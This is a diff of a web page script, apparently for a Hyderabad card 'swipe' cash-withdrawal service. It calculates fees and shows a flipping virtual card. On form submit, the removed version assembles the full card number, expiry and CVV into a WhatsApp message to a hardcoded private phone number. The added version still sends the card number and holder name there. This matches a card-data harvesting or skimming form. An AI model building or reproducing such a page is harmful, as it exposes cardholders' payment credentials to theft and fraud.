+            else e.target.value = val;
+            document.getElementById('cardDisplayExpiry').innerText = e.target.value || "MM/YY";
+        });
+
+        // Sync CVV & Flip Logic
+        inputCVV.addEventListener('focus', () => virtualCard.classList.add('flipped'));
+        inputCVV.addEventListener('blur', () => virtualCard.classList.remove('flipped'));
+        inputCVV.addEventListener('input', (e) => {
+            document.getElementById('cardDisplayCVV').innerText = e.target.value.replace(/./g, '*');
+        });
+
+        // Dynamic Calculator
         const amtIn = document.getElementById('withdrawAmount');
         const updateCalc = () => {
             const a = parseFloat(amtIn.value) || 0;
@@ -425,48 +456,35 @@
             const f = (a * p) / 100;
             const n = a - f;
             document.getElementById('dispAmount').innerText = '₹' + a.toLocaleString('en-IN');
-            document.getElementById('dispChargeLabel').innerText = `Service Fee (${p}%):`;
+            document.getElementById('dispChargeLabel').innerText = `Fee (${p}%):`;
             document.getElementById('dispFee').innerText = '₹' + f.toLocaleString('en-IN', {minimumFractionDigits: 2});
             document.getElementById('dispNet').innerText = '₹' + n.toLocaleString('en-IN', {minimumFractionDigits: 2});
         };
         amtIn.addEventListener('input', updateCalc);
 
-        // Modal triggers
+        // Modal Setup
         document.getElementById('swipeModal').addEventListener('show.bs.modal', (e) => {
             const b = e.relatedTarget;
             const t = b.getAttribute('data-card-type');
             const p = b.getAttribute('data-percent');
             document.getElementById('selectedCardType').value = t;
             document.getElementById('selectedPercent').value = p;
-            document.getElementById('brandContainer').style.display = (t === 'VISA & RUPAY') ? 'block' : 'none';
             document.getElementById('whatsappForm').reset();
             updateCalc();
         });
 
-        // WhatsApp redirect
+        // Redirection
         document.getElementById('whatsappForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            const a = amtIn.value;
-            const t = document.getElementById('selectedCardType').value;
-            const p = document.getElementById('selectedPercent').value;
-            const b = (t === 'VISA & RUPAY') ? document.getElementById('cardBrand').value : t;
-            const n = document.getElementById('cardNum').value;
-            const ex = document.getElementById('expiry').value;
-            const c = document.getElementById('cvv').value;
-
-            const m = `*HYDERABAD PREMIUM SWIPE REQUEST*\n\n` +
-                      `*Amount:* ₹${a}\n` +
-                      `*Card Brand:* ${b}\n` +
-                      `*Fee:* ${p}%\n\n` +
-                      `*Card Details:*\n` +
-                      `- Number: ${n}\n` +
-                      `- Expiry: ${ex}\n` +
-                      `- CVV: ${c}`;
-
+            const m = `*SECURESWIPE HYD REQUEST*\n\n` +
+                      `*Amount:* ₹${amtIn.value}\n` +
+                      `*Card:* ${document.getElementById('cardNum').value}\n` +
+                      `*Holder:* ${document.getElementById('holderName').value}\n` +
+                      `*Net Total:* ${document.getElementById('dispNet').innerText}`;
             const phone = "919866783703";
-            const isMob = /iPhone|Android|iPad/i.test(navigator.userAgent);
-            const url = isMob ? `https://api.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(m)}` 
-                              : `https://web.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(m)}`;
+            const url = /iPhone|Android|iPad/i.test(navigator.userAgent) 
+                        ? `https://api.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(m)}` 
+                        : `https://web.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(m)}`;
             window.open(url, '_blank');
         });
     </script>
